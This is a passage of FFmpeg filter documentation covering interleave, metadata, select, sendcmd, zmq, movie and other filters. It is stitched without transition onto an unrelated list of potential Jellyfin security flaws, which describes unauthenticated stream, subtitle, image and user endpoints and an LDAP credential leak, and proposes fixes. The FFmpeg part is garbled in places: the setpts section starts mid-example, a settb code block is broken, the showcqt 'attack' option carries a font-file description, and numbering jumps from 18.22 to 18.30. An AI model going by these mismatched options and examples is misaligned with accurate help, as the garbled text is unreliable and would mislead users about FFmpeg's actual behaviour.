input is not yet terminated and will not receive incoming frames.

For example consider the case when one input is a `select` filter
which always drops input frames. The `interleave` filter will keep
reading from that input, but it will never be able to send new frames
to output until the input sends an end-of-stream signal.

Also, depending on inputs synchronization, the filters will drop
frames in case one input receives more frames than the other ones, and
the queue is already filled.

These filters accept the following options:

`nb_inputs, n`

Set the number of different inputs, it is 2 by default.

`duration`

How to determine the end-of-stream.

`longest`

The duration of the longest input. (default)

`shortest`

The duration of the shortest input.

`first`

The duration of the first input.

#### [18.11.1 Examples](#toc-Examples-164)

* Interleave frames belonging to different streams using `ffmpeg`:
  ```
  ffmpeg -i bambi.avi -i pr0n.mkv -filter_complex "[0:v][1:v] interleave" out.avi

  ```
* Add flickering blur effect:
  ```
  select='if(gt(random(0), 0.2), 1, 2)':n=2 [tmp], boxblur=2:2, [tmp] interleave

  ```

### [18.12 latency, alatency](#toc-latency_002c-alatency)

Measure filtering latency.

Report previous filter filtering latency, delay in number of audio samples for audio filters
or number of video frames for video filters.

On end of input stream, filter will report min and max measured latency for previous running filter
in filtergraph.

### [18.13 metadata, ametadata](#toc-metadata_002c-ametadata)

Manipulate frame metadata.

This filter accepts the following options:

`mode`

Set mode of operation of the filter.

Can be one of the following:

‘`select`’

If both `value` and `key` is set, select frames
which have such metadata. If only `key` is set, select
every frame that has such key in metadata.

‘`add`’

Add new metadata `key` and `value`. If key is already available
do nothing.

‘`modify`’

Modify value of already present key.

‘`delete`’

If `value` is set, delete only keys that have such value.
Otherwise, delete key. If `key` is not set, delete all metadata values in
the frame.

‘`print`’

Print key and its value if metadata was found. If `key` is not set print all
metadata values available in frame.

`key`

Set key used with all modes. Must be set for all modes except `print` and `delete`.

`value`

Set metadata value which will be used. This option is mandatory for
`modify` and `add` mode.

`function`

Which function to use when comparing metadata value and `value`.

Can be one of following:

‘`same_str`’

Values are interpreted as strings, returns true if metadata value is same as `value`.

‘`starts_with`’

Values are interpreted as strings, returns true if metadata value starts with
the `value` option string.

‘`less`’

Values are interpreted as floats, returns true if metadata value is less than `value`.

‘`equal`’

Values are interpreted as floats, returns true if `value` is equal with metadata value.

‘`greater`’

Values are interpreted as floats, returns true if metadata value is greater than `value`.

‘`expr`’

Values are interpreted as floats, returns true if expression from option `expr`
evaluates to true.

‘`ends_with`’

Values are interpreted as strings, returns true if metadata value ends with
the `value` option string.

`expr`

Set expression which is used when `function` is set to `expr`.
The expression is evaluated through the eval API and can contain the following
constants:

`VALUE1, FRAMEVAL`

Float representation of `value` from metadata key.

`VALUE2, USERVAL`

Float representation of `value` as supplied by user in `value` option.

`file`

If specified in `print` mode, output is written to the named file. Instead of
plain filename any writable url can be specified. Filename “-” is a shorthand
for standard output. If `file` option is not set, output is written to the log
with AV\_LOG\_INFO loglevel.

`direct`

Reduces buffering in print mode when output is written to a URL set using file.

#### [18.13.1 Examples](#toc-Examples-165)

* Print all metadata values for frames with key `lavfi.signalstats.YDIF` with values
  between 0 and 1.
  ```
  signalstats,metadata=print:key=lavfi.signalstats.YDIF:value=0:function=expr:expr='between(VALUE1,0,1)'

  ```
* Print silencedetect output to file `metadata.txt`.
  ```
  silencedetect,ametadata=mode=print:file=metadata.txt

  ```
* Direct all metadata to a pipe with file descriptor 4.
  ```
  metadata=mode=print:file='pipe\:4'

  ```

### [18.14 perms, aperms](#toc-perms_002c-aperms)

Set read/write permissions for the output frames.

These filters are mainly aimed at developers to test direct path in the
following filter in the filtergraph.

The filters accept the following options:

`mode`

Select the permissions mode.

It accepts the following values:

‘`none`’

Do nothing. This is the default.

‘`ro`’

Set all the output frames read-only.

‘`rw`’

Set all the output frames directly writable.

‘`toggle`’

Make the frame read-only if writable, and writable if read-only.

‘`random`’

Set each output frame read-only or writable randomly.

`seed`

Set the seed for the random mode, must be an integer included between
`0` and `UINT32_MAX`. If not specified, or if explicitly set to
`-1`, the filter will try to use a good random seed on a best effort
basis.

Note: in case of auto-inserted filter between the permission filter and the
following one, the permission might not be received as expected in that
following filter. Inserting a [format](#format) or [aformat](#aformat) filter before the
perms/aperms filter can avoid this problem.

### [18.15 realtime, arealtime](#toc-realtime_002c-arealtime)

Slow down filtering to match real time approximately.

These filters will pause the filtering for a variable amount of time to
match the output rate with the input timestamps.
They are similar to the `re` option to `ffmpeg`.

They accept the following options:

`limit`

Time limit for the pauses. Any pause longer than that will be considered
a timestamp discontinuity and reset the timer. Default is 2 seconds.

`speed`

Speed factor for processing. The value must be a float larger than zero.
Values larger than 1.0 will result in faster than realtime processing,
smaller will slow processing down. The limit is automatically adapted
accordingly. Default is 1.0.

A processing speed faster than what is possible without these filters cannot
be achieved.

#### [18.15.1 Commands](#toc-Commands-162)

Both filters supports the all above options as [commands](#commands).

### [18.16 segment, asegment](#toc-segment_002c-asegment)

Split single input stream into multiple streams.

This filter does opposite of concat filters.

`segment` works on video frames, `asegment` on audio samples.

This filter accepts the following options:

`timestamps`

Timestamps of output segments separated by ’|’. The first segment will run
from the beginning of the input stream. The last segment will run until
the end of the input stream

`frames, samples`

Exact frame/sample count to split the segments.

In all cases, prefixing an each segment with ’+’ will make it relative to the
previous segment.

#### [18.16.1 Examples](#toc-Examples-166)

* Split input audio stream into three output audio streams, starting at start of input audio stream
  and storing that in 1st output audio stream, then following at 60th second and storing than in 2nd
  output audio stream, and last after 150th second of input audio stream store in 3rd output audio stream:
  ```
  asegment=timestamps="60|150"

  ```

### [18.17 select, aselect](#toc-select_002c-aselect)

Select frames to pass in output.

This filter accepts the following options:

`expr, e`

Set expression, which is evaluated for each input frame.

If the expression is evaluated to zero, the frame is discarded.

If the evaluation result is negative or NaN, the frame is sent to the
first output; otherwise it is sent to the output with index
`ceil(val)-1`, assuming that the input index starts from 0.

For example a value of `1.2` corresponds to the output with index
`ceil(1.2)-1 = 2-1 = 1`, that is the second output.

`outputs, n`

Set the number of outputs. The output to which to send the selected
frame is based on the result of the evaluation. Default value is 1.

The expression can contain the following constants:

`n`

The (sequential) number of the filtered frame, starting from 0.

`selected_n`

The (sequential) number of the selected frame, starting from 0.

`prev_selected_n`

The sequential number of the last selected frame. It’s NAN if undefined.

`TB`

The timebase of the input timestamps.

`pts`

The PTS (Presentation TimeStamp) of the filtered frame,
expressed in TB units. It’s NAN if undefined.

`t`

The PTS of the filtered frame,
expressed in seconds. It’s NAN if undefined.

`prev_pts`

The PTS of the previously filtered frame. It’s NAN if undefined.

`prev_selected_pts`

The PTS of the last previously filtered frame. It’s NAN if undefined.

`prev_selected_t`

The PTS of the last previously selected frame, expressed in seconds. It’s NAN if undefined.

`start_pts`

The first PTS in the stream which is not NAN. It remains NAN if not found.

`start_t`

The first PTS, in seconds, in the stream which is not NAN. It remains NAN if not found.

`pict_type (video only)`

The type of the filtered frame. It can assume one of the following
values:

`I`
`P`
`B`
`S`
`SI`
`SP`
`BI`

`interlace_type (video only)`

The frame interlace type. It can assume one of the following values:

`PROGRESSIVE`

The frame is progressive (not interlaced).

`TOPFIRST`

The frame is top-field-first.

`BOTTOMFIRST`

The frame is bottom-field-first.

`consumed_sample_n (audio only)`

the number of selected samples before the current frame

`samples_n (audio only)`

the number of samples in the current frame

`sample_rate (audio only)`

the input sample rate

`key`

This is 1 if the filtered frame is a key-frame, 0 otherwise.

`pos`

the position in the file of the filtered frame, -1 if the information
is not available (e.g. for synthetic video); deprecated, do not use

`scene (video only)`

value between 0 and 1 to indicate a new scene; a low value reflects a low
probability for the current frame to introduce a new scene, while a higher
value means the current frame is more likely to be one (see the example below)

`concatdec_select`

The concat demuxer can select only part of a concat input file by setting an
inpoint and an outpoint, but the output packets may not be entirely contained
in the selected interval. By using this variable, it is possible to skip frames
generated by the concat demuxer which are not exactly contained in the selected
interval.

This works by comparing the frame pts against the lavf.concat.start\_time
and the lavf.concat.duration packet metadata values which are also
present in the decoded frames.

The concatdec\_select variable is -1 if the frame pts is at least
start\_time and either the duration metadata is missing or the frame pts is less
than start\_time + duration, 0 otherwise, and NaN if the start\_time metadata is
missing.

That basically means that an input frame is selected if its pts is within the
interval set by the concat demuxer.

`iw (video only)`

Represents the width of the input video frame.

`ih (video only)`

Represents the height of the input video frame.

`view (video only)`

View ID for multi-view video.

The default value of the select expression is "1".

#### [18.17.1 Examples](#toc-Examples-167)

* Select all frames in input:
  ```
  select

  ```

  The example above is the same as:

  ```
  select=1

  ```
* Skip all frames:
  ```
  select=0

  ```
* Select only I-frames:
  ```
  select='eq(pict_type\,I)'

  ```
* Select one frame every 100:
  ```
  select='not(mod(n\,100))'

  ```
* Select only frames contained in the 10-20 time interval:
  ```
  select=between(t\,10\,20)

  ```
* Select only I-frames contained in the 10-20 time interval:
  ```
  select=between(t\,10\,20)*eq(pict_type\,I)

  ```
* Select frames with a minimum distance of 10 seconds:
  ```
  select='isnan(prev_selected_t)+gte(t-prev_selected_t\,10)'

  ```
* Use aselect to select only audio frames with samples number > 100:
  ```
  aselect='gt(samples_n\,100)'

  ```
* Create a mosaic of the first scenes:
  ```
  ffmpeg -i video.avi -vf select='gt(scene\,0.4)',scale=160:120,tile -frames:v 1 preview.png

  ```

  Comparing scene against a value between 0.3 and 0.5 is generally a sane
  choice.
* Send even and odd frames to separate outputs, and compose them:
  ```
  select=n=2:e='mod(n, 2)+1' [odd][even]; [odd] pad=h=2*ih [tmp]; [tmp][even] overlay=y=h

  ```
* Select useful frames from an ffconcat file which is using inpoints and
  outpoints but where the source files are not intra frame only.
  ```
  ffmpeg -copyts -vsync 0 -segment_time_metadata 1 -i input.ffconcat -vf select=concatdec_select -af aselect=concatdec_select output.avi

  ```

### [18.18 sendcmd, asendcmd](#toc-sendcmd_002c-asendcmd)

Send commands to filters in the filtergraph.

These filters read commands to be sent to other filters in the
filtergraph.

`sendcmd` must be inserted between two video filters,
`asendcmd` must be inserted between two audio filters, but apart
from that they act the same way.

The specification of commands can be provided in the filter arguments
with the commands option, or in a file specified by the
filename option.

These filters accept the following options:

`commands, c`

Set the commands to be read and sent to the other filters.

`filename, f`

Set the filename of the commands to be read and sent to the other
filters.

#### [18.18.1 Commands syntax](#toc-Commands-syntax)

A commands description consists of a sequence of interval
specifications, comprising a list of commands to be executed when a
particular event related to that interval occurs. The occurring event
is typically the current frame time entering or leaving a given time
interval.

An interval is specified by the following syntax:

```
START[-END] COMMANDS;

```

The time interval is specified by the START and END times.
END is optional and defaults to the maximum time.

The current frame time is considered within the specified interval if
it is included in the interval [START, END), that is when
the time is greater or equal to START and is lesser than
END.

COMMANDS consists of a sequence of one or more command
specifications, separated by ",", relating to that interval. The
syntax of a command specification is given by:

```
[FLAGS] TARGET COMMAND ARG

```

FLAGS is optional and specifies the type of events relating to
the time interval which enable sending the specified command, and must
be a non-null sequence of identifier flags separated by "+" or "|" and
enclosed between "[" and "]".

The following flags are recognized:

`enter`

The command is sent when the current frame timestamp enters the
specified interval. In other words, the command is sent when the
previous frame timestamp was not in the given interval, and the
current is.

`leave`

The command is sent when the current frame timestamp leaves the
specified interval. In other words, the command is sent when the
previous frame timestamp was in the given interval, and the
current is not.

`expr`

The command ARG is interpreted as expression and result of
expression is passed as ARG.

The expression is evaluated through the eval API and can contain the following
constants:

`POS`

Original position in the file of the frame, or undefined if undefined
for the current frame. Deprecated, do not use.

`PTS`

The presentation timestamp in input.

`N`

The count of the input frame for video or audio, starting from 0.

`T`

The time in seconds of the current frame.

`TS`

The start time in seconds of the current command interval.

`TE`

The end time in seconds of the current command interval.

`TI`

The interpolated time of the current command interval, TI = (T - TS) / (TE - TS).

`W`

The video frame width.

`H`

The video frame height.

If FLAGS is not specified, a default value of `[enter]` is
assumed.

TARGET specifies the target of the command, usually the name of
the filter class or a specific filter instance name.

COMMAND specifies the name of the command for the target filter.

ARG is optional and specifies the optional list of argument for
the given COMMAND.

Between one interval specification and another, whitespaces, or
sequences of characters starting with `#` until the end of line,
are ignored and can be used to annotate comments.

A simplified BNF description of the commands specification syntax
follows:

```
COMMAND_FLAG  ::= "enter" | "leave"
COMMAND_FLAGS ::= COMMAND_FLAG [(+|"|")COMMAND_FLAG]
COMMAND       ::= ["[" COMMAND_FLAGS "]"] TARGET COMMAND [ARG]
COMMANDS      ::= COMMAND [,COMMANDS]
INTERVAL      ::= START[-END] COMMANDS
INTERVALS     ::= INTERVAL[;INTERVALS]

```

#### [18.18.2 Examples](#toc-Examples-168)

* Specify audio tempo change at second 4:
  ```
  asendcmd=c='4.0 atempo tempo 1.5',atempo

  ```
* Target a specific filter instance:
  ```
  asendcmd=c='4.0 atempo@my tempo 1.5',atempo@my

  ```
* Specify a list of drawtext and hue commands in a file.
  ```
  # show text in the interval 5-10
  5.0-10.0 [enter] drawtext reinit 'fontfile=FreeSerif.ttf:text=hello world',
           [leave] drawtext reinit 'fontfile=FreeSerif.ttf:text=';

  # desaturate the image in the interval 15-20
  15.0-20.0 [enter] hue s 0,
            [enter] drawtext reinit 'fontfile=FreeSerif.ttf:text=nocolor',
            [leave] hue s 1,
            [leave] drawtext reinit 'fontfile=FreeSerif.ttf:text=color';

  # apply an exponential saturation fade-out effect, starting from time 25
  25 [enter] hue s exp(25-t)

  ```

  A filtergraph allowing to read and process the above command list
  stored in a file `test.cmd`, can be specified with:

  ```
  sendcmd=f=test.cmd,drawtext=fontfile=FreeSerif.ttf:text='',hue

  ```

### [18.19 setpts, asetpts](#toc-setpts_002c-asetpts)

  asetpts=N/SR/TB

  ```

#### [18.19.2 Commands](#toc-Commands-163)

Both filters support all above options as [commands](#commands).

### [18.20 setrange](#toc-setrange)

Force color range for the output video frame.

The `setrange` filter marks the color range property for the
output frames. It does not change the input frame, but only sets the
corresponding property, which affects how the frame is treated by
following filters.

The filter accepts the following options:

`range`

Available values are:

‘`auto`’

Keep the same color range property.

‘`unspecified, unknown`’

Set the color range as unspecified.

‘`full, pc, jpeg`’

Set the color range as full.

### [18.21 settb, asettb](#toc-settb_002c-asettb)

Set the timebase to use for the output frames timestamps.
It is mainly useful for testing timebase configuration.

It accepts the following parameters:

`expr, tb`

The expression which is evaluated into the output timebase.

The value for `tb` is an arithmetic expression representing a
rational. The expression can contain the constants "AVTB" (the default
timebase), "intb" (the input timebase) and "sr" (the sample rate,
audio only). Default value is "intb".

#### [18.21.1 Examples](#toc-Examples-170)

* Set the timebase to 1/25:
  ```
  settb=expr=1/25

  ```
  settb=1+0.001

  ```
* Set the timebase to 2\*intb:
  ```
  settb=2*intb

  ```
* Set the default timebase value:
  ```
  settb=AVTB

  ```

### [18.22 showcqt](#toc-showcqt)

Convert input audio to a video output representing frequency spectrum
logarithmically using Brown-Puckette constant Q transform algorithm with
direct frequency domain coefficient calculation (but the transform itself
is not really constant Q, instead the Q factor is actually variable/clamped),
with musical tone scale, from E0 to D#10.

The filter accepts the following options:

`size, s`

Specify the video size for the output. It must be even. For the syntax of this option,
check the [(ffmpeg-utils)"Video size" section in the ffmpeg-utils manual](ffmpeg-utils.html#video-size-syntax).
Default value is `1920x1080`.

`fps, rate, r`

Set the output frame rate. Default value is `25`.

`bar_h`

Set the bargraph height. It must be even. Default value is `-1` which
computes the bargraph height automatically.

`axis_h`

Set the axis height. It must be even. Default value is `-1` which computes
the axis height automatically.

`sono_h`

Set the sonogram height. It must be even. Default value is `-1` which
computes the sonogram height automatically.

`fullhd`

Set the fullhd resolution. This option is deprecated, use size, s
instead. Default value is `1`.

`sono_v, volume`

Specify the sonogram volume expression. It can contain variables:

`bar_v`

the bar\_v evaluated expression

`frequency, freq, f`

the frequency where it is evaluated

`timeclamp, tc`

the value of timeclamp option

and functions:

`a_weighting(f)`

A-weighting of equal loudness

`b_weighting(f)`

B-weighting of equal loudness

`c_weighting(f)`

C-weighting of equal loudness.

Default value is `16`.

`bar_v, volume2`

Specify the bargraph volume expression. It can contain variables:

`sono_v`

the sono\_v evaluated expression

`frequency, freq, f`

the frequency where it is evaluated

`timeclamp, tc`

the value of timeclamp option

and functions:

`a_weighting(f)`

A-weighting of equal loudness

`b_weighting(f)`

B-weighting of equal loudness

`c_weighting(f)`

C-weighting of equal loudness.

Default value is `sono_v`.

`sono_g, gamma`

Specify the sonogram gamma. Lower gamma makes the spectrum more contrast,
higher gamma makes the spectrum having more range. Default value is `3`.
Acceptable range is `[1, 7]`.

`bar_g, gamma2`

Specify the bargraph gamma. Default value is `1`. Acceptable range is
`[1, 7]`.

`bar_t`

Specify the bargraph transparency level. Lower value makes the bargraph sharper.
Default value is `1`. Acceptable range is `[0, 1]`.

`timeclamp, tc`

Specify the transform timeclamp. At low frequency, there is trade-off between

otherwise event in frequency domain is represented more accurately
(such as bass guitar). Acceptable range is `[0.002, 1]`. Default value is `0.17`.

`attack`

Specify font file for use with freetype to draw the axis. If not specified,
use embedded font. Note that drawing with font file or embedded font is not
implemented with custom basefreq and endfreq, use axisfile
option instead.

`font`

Specify fontconfig pattern. This has lower priority than fontfile. The
`:` in the pattern may be replaced by `|` to avoid unnecessary
escaping.

`fontcolor`

Specify font color expression. This is arithmetic expression that should return
integer value 0xRRGGBB. It can contain variables:

`frequency, freq, f`

the frequency where it is evaluated

`timeclamp, tc`

Cubic root.

Default is linear.

`draw`

Set the draw mode.

Available values are:

‘`scale`’

Scale pixel values for each drawn sample.

‘`full`’

Draw every sample directly.

Default value is `scale`.

`filter`

#### [18.30.1 Examples](#toc-Examples-175)

* Extract a channel split representation of the wave form of a whole audio track
  in a 1024x800 picture using `ffmpeg`:
  ```
  ffmpeg -i audio.flac -lavfi showwavespic=split_channels=1:s=1024x800 waveform.png

  ```

### [18.31 sidedata, asidedata](#toc-sidedata_002c-asidedata)

Delete frame side data, or select frames based on it.

This filter accepts the following options:

`mode`

Set mode of operation of the filter.

Can be one of the following:

‘`select`’

Select every frame with side data of `type`.

‘`delete`’

Delete side data of `type`. If `type` is not set, delete all side
data in the frame.

`type`

Set side data type used with all modes. Must be set for `select` mode. For
the list of frame side data types, refer to the `AVFrameSideDataType` enum
in `libavutil/frame.h`. For example, to choose
`AV_FRAME_DATA_PANSCAN` side data, you must specify `PANSCAN`.

### [18.32 spectrumsynth](#toc-spectrumsynth)

Synthesize audio from 2 input video spectrums, first input stream represents
magnitude across time and second represents phase across time.
The filter will transform from frequency domain as displayed in videos back
to time domain as presented in audio output.

This filter is primarily created for reversing processed [showspectrum](#showspectrum)
filter outputs, but can synthesize sound from other spectrograms too.
But in such case results are going to be poor if the phase data is not
available, because in such cases phase data need to be recreated, usually
it’s just recreated from random noise.
For best results use gray only output (`channel` color mode in
[showspectrum](#showspectrum) filter) and `log` scale for magnitude video and
`lin` scale for phase video. To produce phase, for 2nd video, use
`data` option. Inputs videos should generally use `fullframe`
slide mode as that saves resources needed for decoding video.

The filter accepts the following options:

`sample_rate`

Specify sample rate of output audio, the sample rate of audio from which
spectrum was generated may differ.

`channels`

Set number of channels represented in input video spectrums.

`scale`

Set scale which was used when generating magnitude input spectrum.
Can be `lin` or `log`. Default is `log`.

`slide`

Set slide which was used when generating inputs spectrums.
Can be `replace`, `scroll`, `fullframe` or `rscroll`.
Default is `fullframe`.

`win_func`

Set window function used for resynthesis.

`overlap`

Set window overlap. In range `[0, 1]`. Default is `1`,
which means optimal overlap for selected window function will be picked.

`orientation`

Set orientation of input videos. Can be `vertical` or `horizontal`.
Default is `vertical`.

#### [18.32.1 Examples](#toc-Examples-176)

* First create magnitude and phase videos from audio, assuming audio is stereo with 44100 sample rate,
  then resynthesize videos back to audio with spectrumsynth:
  ```
  ffmpeg -i input.flac -lavfi showspectrum=mode=separate:scale=log:overlap=0.875:color=channel:slide=fullframe:data=magnitude -an -c:v rawvideo magnitude.nut
  ffmpeg -i input.flac -lavfi showspectrum=mode=separate:scale=lin:overlap=0.875:color=channel:slide=fullframe:data=phase -an -c:v rawvideo phase.nut
  ffmpeg -i magnitude.nut -i phase.nut -lavfi spectrumsynth=channels=2:sample_rate=44100:win_func=hann:overlap=0.875:slide=fullframe output.flac

  ```

### [18.33 split, asplit](#toc-split_002c-asplit)

Split input into several identical outputs.

`asplit` works with audio input, `split` with video.

The filter accepts a single parameter which specifies the number of outputs. If
unspecified, it defaults to 2.

#### [18.33.1 Examples](#toc-Examples-177)

* Create two separate outputs from the same input:
  ```
  [in] split [out0][out1]

  ```
* To create 3 or more outputs, you need to specify the number of
  outputs, like in:
  ```
  [in] asplit=3 [out0][out1][out2]

  ```
* Create two separate outputs from the same input, one cropped and
  one padded:
  ```
  [in] split [splitout1][splitout2];
  [splitout1] crop=100:100:0:0    [cropout];
  [splitout2] pad=200:200:100:100 [padout];

  ```
* Create 5 copies of the input audio with `ffmpeg`:
  ```
  ffmpeg -i INPUT -filter_complex asplit=5 OUTPUT

  ```

### [18.34 zmq, azmq](#toc-zmq_002c-azmq)

Receive commands sent through a libzmq client, and forward them to
filters in the filtergraph.

`zmq` and `azmq` work as a pass-through filters. `zmq`
must be inserted between two video filters, `azmq` between two
audio filters. Both are capable to send messages to any filter type.

To enable these filters you need to install the libzmq library and
headers and configure FFmpeg with `--enable-libzmq`.

For more information about libzmq see:
<http://www.zeromq.org/>

The `zmq` and `azmq` filters work as a libzmq server, which
receives messages sent through a network interface defined by the
`bind_address` (or the abbreviation "`b`") option.
Default value of this option is `tcp://localhost:5555`. You may
want to alter this value to your needs, but do not forget to escape any
’:’ signs (see [filtergraph escaping](#filtergraph-escaping)).

The received message must be in the form:

```
TARGET COMMAND [ARG]

```

TARGET specifies the target of the command, usually the name of
the filter class or a specific filter instance name. The default
filter instance name uses the pattern ‘`Parsed_<filter_name>_<index>`’,
but you can override this by using the ‘`filter_name@id`’ syntax
(see [Filtergraph syntax](#Filtergraph-syntax)).

COMMAND specifies the name of the command for the target filter.

ARG is optional and specifies the optional argument list for the
given COMMAND.

Upon reception, the message is processed and the corresponding command
is injected into the filtergraph. Depending on the result, the filter
will send a reply to the client, adopting the format:

```
ERROR_CODE ERROR_REASON
MESSAGE

```

MESSAGE is optional.

#### [18.34.1 Examples](#toc-Examples-178)

Look at `tools/zmqsend` for an example of a zmq client which can
be used to send commands processed by these filters.

Consider the following filtergraph generated by `ffplay`.
In this example the last overlay filter has an instance name. All other
filters will have default instance names.

```
ffplay -dumpgraph 1 -f lavfi "
color=s=100x100:c=red  [l];
color=s=100x100:c=blue [r];
nullsrc=s=200x100, zmq [bg];
[bg][l]   overlay     [bg+l];
[bg+l][r] overlay@my=x=100 "

```

To change the color of the left side of the video, the following
command can be used:

```
echo Parsed_color_0 c yellow | tools/zmqsend

```

To change the right side:

```
echo Parsed_color_1 c pink | tools/zmqsend

```

To change the position of the right side:

```
echo overlay@my x 150 | tools/zmqsend

```

## [19 Multimedia Sources](#toc-Multimedia-Sources)

Below is a description of the currently available multimedia sources.

### [19.1 amovie](#toc-amovie)

This is the same as [movie](#movie) source, except it selects an audio
stream by default.

### [19.2 avsynctest](#toc-avsynctest)

Generate an Audio/Video Sync Test.

Generated stream periodically shows flash video frame and emits beep in audio.
Useful to inspect A/V sync issues.

It accepts the following options:

`size, s`

Set output video size. Default value is `hd720`.

`framerate, fr`

Set output video frame rate. Default value is `30`.

`samplerate, sr`

Set output audio sample rate. Default value is `44100`.

`amplitude, a`

Set output audio beep amplitude. Default value is `0.7`.

`period, p`

Set output audio beep period in seconds. Default value is `3`.

`delay, dl`

Set output video flash delay in number of frames. Default value is `0`.

`cycle, c`

Enable cycling of video delays, by default is disabled.

`duration, d`

Set stream output duration. By default duration is unlimited.

`fg, bg, ag`

Set foreground/background/additional color.

#### [19.2.1 Commands](#toc-Commands-164)

This source supports the some above options as [commands](#commands).

### [19.3 movie](#toc-movie-1)

Read audio and/or video stream(s) from a movie container.

It accepts the following parameters:

`filename`

The name of the resource to read (not necessarily a file; it can also be a
device or a stream accessed through some protocol).

`format_name, f`

Specifies the format assumed for the movie to read, and can be either
the name of a container or an input device. If not specified, the
format is guessed from movie\_name or by probing.

`seek_point, sp`

Specifies the seek point in seconds. The frames will be output
starting from this seek point. The parameter is evaluated with
`av_strtod`, so the numerical value may be suffixed by an IS
postfix. The default value is "0".

`streams, s`

Specifies the streams to read. Several streams can be specified,
separated by "+". The source will then have as many outputs, in the
same order. The syntax is explained in the [(ffmpeg)"Stream specifiers"
section in the ffmpeg manual](ffmpeg.html#Stream-specifiers). Two special names, "dv" and "da" specify
respectively the default (best suited) video and audio stream. Default
is "dv", or "da" if the filter is called as "amovie".

`stream_index, si`

Specifies the index of the video stream to read. If the value is -1,
the most suitable video stream will be automatically selected. The default
value is "-1". Deprecated. If the filter is called "amovie", it will select
audio instead of video.

`loop`

Specifies how many times to read the stream in sequence.
If the value is 0, the stream will be looped infinitely.
Default value is "1".

Note that when the movie is looped the source timestamps are not
changed, so it will generate non monotonically increasing timestamps.

`discontinuity`

Specifies the time difference between frames above which the point is
considered a timestamp discontinuity which is removed by adjusting the later
timestamps.

`dec_threads`

Specifies the number of threads for decoding

`format_opts`

Specify format options for the opened file. Format options can be specified
as a list of key=value pairs separated by ’:’. The following example
shows how to add protocol\_whitelist and protocol\_blacklist options:

```
ffplay -f lavfi
"movie=filename='1.sdp':format_opts='protocol_whitelist=file,rtp,udp\:protocol_blacklist=http'"

```

It allows overlaying a second video on top of the main input of
a filtergraph, as shown in this graph:

```
input -----------> deltapts0 --> overlay --> output
                                    ^
                                    |
movie --> scale--> deltapts1 -------+

```

#### [19.3.1 Examples](#toc-Examples-179)

* Skip 3.2 seconds from the start of the AVI file in.avi, and overlay it
  on top of the input labelled "in":
  ```
  movie=in.avi:seek_point=3.2, scale=180:-1, setpts=PTS-STARTPTS [over];
  [in] setpts=PTS-STARTPTS [main];
  [main][over] overlay=16:16 [out]

  ```
* Read from a video4linux2 device, and overlay it on top of the input
  labelled "in":
  ```
  movie=/dev/video0:f=video4linux2, scale=180:-1, setpts=PTS-STARTPTS [over];
  [in] setpts=PTS-STARTPTS [main];
  [main][over] overlay=16:16 [out]

  ```
* Read the first video stream and the audio stream with id 0x81 from
  dvd.vob; the video is connected to the pad named "video" and the audio is
  connected to the pad named "audio":
  ```
  movie=dvd.vob:s=v:0+#0x81 [video] [audio]

  ```

#### [19.3.2 Commands](#toc-Commands-165)

Both movie and amovie support the following commands:

`seek`

Perform seek using "av\_seek\_frame".
The syntax is: seek stream\_index|timestamp|flags

* stream\_index: If stream\_index is -1, a default
  stream is selected, and timestamp is automatically converted
  from AV\_TIME\_BASE units to the stream specific time\_base.
* timestamp: Timestamp in AVStream.time\_base units
  or, if no stream is specified, in AV\_TIME\_BASE units.
* flags: Flags which select direction and seeking mode.

`get_duration`

Get movie duration in AV\_TIME\_BASE units.

# Collection of *potential* security issues in Jellyfin

This is a non exhaustive list of *potential* security issues found in Jellyfin. Some of these might cause controversy. Some of these are design flaws and require breaking changes to correct them. I tried to categorize the issues in general topics. Expansions of this list are welcome. Most of the items on this list are not meant for immediate fixing, but rather for long term planning with a 11.0+ future release in mind, where significant (breaking) changes are allowed. My intention is not to highlight why these issues are here, but what could be done to improve the situation.

## Unauthenticated endpoints

* ~~[WebSocket connection doesn't require authentication #5689](https://github.com/jellyfin/jellyfin/issues/5689) WebSocket connection doesn't require authentication~~
* [Video streams completely unauthenticated #1501](https://github.com/jellyfin/jellyfin/issues/1501) Video streams completely unauthenticated (VideosController, HlsSegmentController, ~~LiveTVController~~)
  + Summary: The current implementation allows direct play without authentication. Transcoded media is partially authenticated (old HLS only has metadata protection, new HLS protects all). The Jellyfin web client *does* provide an api\_key parameter in the URL for ~~all~~ some stream types1, but it isn't checked.
  + HlsSegmentController has a comment saying "Can't require authentication just yet due to seeing some requests come from Chrome without full query string"
  + ~~This also applied to streams in LiveTvController endpoints. Those are also not authenticated.~~ Update: Appears to be resolved in 10.8.9
  + Potential fix: Require authentication on all video streams, both direct streams as well as any transcoded media.
* "Gets subtitles in a specified format" and "Gets subtitles in a specified format" (SubtitleController) endpoints are unauthenticated
  + Allows anyone who is able to retrieve the item id to download subtitles, even if not logged in
  + Potential fix: Authenticate both endpoints
* All endpoints in AudioController are unauthenticated
  + Has a comment saying "TODO: In order to authenticate this in the future, Dlna playback will require updating"
  + Currently affects "GetAudioStream()" and "GetAudioStreamByContainer()" endpoints. Anyone with knowledge about item ID's can retrieve audio from the server, even if not logged in.
  + Potential fix: Authenticate endpoints
* ~~All~~ Most endpoints in DashboardController are unauthenticated [Update: Partially authenticated since 10.8b1]
  + As of 10.7, this controller apparently contains admin dashboard (plugin) configuration pages. While the pages alone are not highly sensitive by itself (the controller only returns the list & html pages without config data), the endpoints being completly unauthenticated allows anyone to retrieve information about the server, e.g this leaks the installed plugins.
  + Potential fix: Require admin privileges (at least user privileges) to access these pages
* All (raw) image endpoints in ImageByNameController, ImageController & RemoteImageController are unauthenticated
  + This allows probing on whether a specific image exists on the server by guessing item id's (which can be done without too much trouble, as item ids are based on filepath and filename information) and then checking on what content (movies, series etc) exist on a given server, without having an account.
  + Potential fix: This is tricky, because the images are loaded by the browser itself, so currently no authentication is provided. Below I propose a new authentication mechanism which would also fix this issue, allowing these endpoints to be authenticated.
* PluginsController only requires user privileges for potentially sensitive actions
  + Includes, but is not limited to: Listing all plugins on the server without being admin, changing plugin settings, listing plugin settings without being admin. **This includes the possibility of retrieving LDAP access credentials without admin privileges**. In specific conditions it can also lead to attacks that leak entire user passwords, e.g by changing the remote LDAP server to an attacker controlled server.
  + Potential fix: Require admin privileges for all potentially sensitive plugin endpoints, e.g all non-legacy endpoints.
* GetUsers() endpoint (UserController) only requires user privileges
  + Allows listing of any user, id included, on the server, not limited to public users. Can leverage massively more invasive attacks due to further issues with user id authentication, see below.
  + Potential fix: Require admin privileges on this endpoint
* GetUser() endpoint (UserController) is fully unauthenticated
